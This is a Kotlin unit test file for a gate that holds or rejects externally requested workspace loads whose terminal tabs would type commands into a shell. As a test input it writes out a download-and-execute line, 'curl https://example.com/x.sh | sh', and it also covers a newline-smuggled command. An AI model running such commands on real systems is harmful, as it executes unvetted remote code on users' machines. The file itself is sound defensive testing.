package ai.rever.boss.components.workspaces

import ai.rever.boss.cli.CLICommand
import ai.rever.boss.plugin.workspace.LayoutWorkspace
import ai.rever.boss.plugin.workspace.PanelConfig
import ai.rever.boss.plugin.workspace.SplitConfig
import ai.rever.boss.plugin.workspace.TabConfig
import ai.rever.boss.utils.DeepLinkOrigin
import kotlin.test.Test
import kotlin.test.assertEquals

/**
 * Guards what happens to a `boss://workspace?path=` request, which is decided
 * by who asked and by what the Space's terminal tabs would type into a shell.
 *
 * Applying a Space types each terminal tab's `initialCommand` into a new
 * terminal — the exact PTY write the `boss://terminal` gate exists to protect —
 * so [spaceLoadDisposition] holds an external load carrying commands for the
 * operator, and drops one it cannot show in full. These cases are the ones
 * that regress silently.
 */
class SpaceLoadDispositionTest {
    @Test
    fun `a load the operator asked for themselves is never held up`() {
        assertEquals(
            SpaceLoadDisposition.LOAD,
            spaceLoadDisposition(listOf("curl https://example.com/x.sh | sh"), requiresConfirmation = false),
        )
        // The operator's own `boss workspace <file>` ran whatever the Space
        // carried before the gate; that behaviour is unchanged, so neither the
        // display bound nor the shape check applies on this path.
        assertEquals(SpaceLoadDisposition.LOAD, spaceLoadDisposition(listOf(""), requiresConfirmation = false))
        assertEquals(
            SpaceLoadDisposition.LOAD,
            spaceLoadDisposition(listOf("e".repeat(SPACE_LOAD_CONFIRM_MAX_COMMAND_LENGTH + 1)), false),
        )
    }

    @Test
    fun `an external Space with no terminal commands loads without a prompt`() {
        // Browser and editor tabs type nothing into a shell.
        assertEquals(SpaceLoadDisposition.LOAD, spaceLoadDisposition(emptyList(), requiresConfirmation = true))
        assertEquals(
            SpaceLoadDisposition.LOAD,
            spaceLoadDisposition(spaceWithTabs(browserTab(), editorTab()).spaceTerminalCommands(), true),
        )
    }

    @Test
    fun `an external Space carrying terminal commands is held for confirmation`() {
        assertEquals(
            SpaceLoadDisposition.CONFIRM,
            spaceLoadDisposition(spaceWithTabs(browserTab(), terminalTab("ls -la")).spaceTerminalCommands(), true),
        )
        assertEquals(
            SpaceLoadDisposition.CONFIRM,
            spaceLoadDisposition(listOf("e".repeat(SPACE_LOAD_CONFIRM_MAX_COMMAND_LENGTH)), true),
        )
    }

    @Test
    fun `an external Space whose commands cannot be shown in full is dropped`() {
        // Nobody can meaningfully approve a command the prompt cannot show.
        assertEquals(
            SpaceLoadDisposition.REJECT,
            spaceLoadDisposition(listOf("e".repeat(SPACE_LOAD_CONFIRM_MAX_COMMAND_LENGTH + 1)), true),
        )
        // A command an embedded line break would submit, hidden from the prompt.
        assertEquals(SpaceLoadDisposition.REJECT, spaceLoadDisposition(listOf("two\nlines"), true))
        // More commands than one prompt can list.
        assertEquals(
            SpaceLoadDisposition.REJECT,
            spaceLoadDisposition(List(SPACE_LOAD_CONFIRM_MAX_COMMAND_COUNT + 1) { "echo $it" }, true),
        )
        // At the cap itself the prompt can still show every command.
        assertEquals(
            SpaceLoadDisposition.CONFIRM,
            spaceLoadDisposition(List(SPACE_LOAD_CONFIRM_MAX_COMMAND_COUNT) { "echo $it" }, true),
        )
    }

    @Test
    fun `commands are collected from every terminal tab in every panel`() {
        val space =
            LayoutWorkspace(
                id = "test",
                name = "Test",
                description = "",
                layout =
                    SplitConfig.VerticalSplit(
                        left = SplitConfig.SinglePanel(PanelConfig("left", listOf(terminalTab("cd {projectPath}")))),
                        right =
                            SplitConfig.SinglePanel(
                                PanelConfig("right", listOf(browserTab(), terminalTab("npm test"))),
                            ),
                    ),
            )
        assertEquals(listOf("cd {projectPath}", "npm test"), space.spaceTerminalCommands())
    }

    @Test
    fun `an unstated origin on the queued load is external, so it gates`() {
        // DeepLinkOrigin treats absence as EXTERNAL; the queued command must
        // default the same way or a caller that forgets to say bypasses the gate.
        assertEquals(DeepLinkOrigin.EXTERNAL, CLICommand.LoadWorkspace("/x/space.json").origin)
        assertEquals(
            DeepLinkOrigin.OPERATOR_CLI,
            CLICommand.LoadWorkspace("/x/space.json", DeepLinkOrigin.OPERATOR_CLI).origin,
        )
    }

    private fun browserTab() = TabConfig(type = "browser", title = "Browser", url = "https://example.com")

    private fun editorTab() = TabConfig(type = "editor", title = "Notes", filePath = "/tmp/notes.md")

    private fun terminalTab(command: String) = TabConfig(type = "terminal", title = "Term", initialCommand = command)

    private fun spaceWithTabs(vararg tabs: TabConfig) =
        LayoutWorkspace(
            id = "test",
            name = "Test",
            description = "",
            layout = SplitConfig.SinglePanel(PanelConfig("main", tabs.toList())),
        )
}
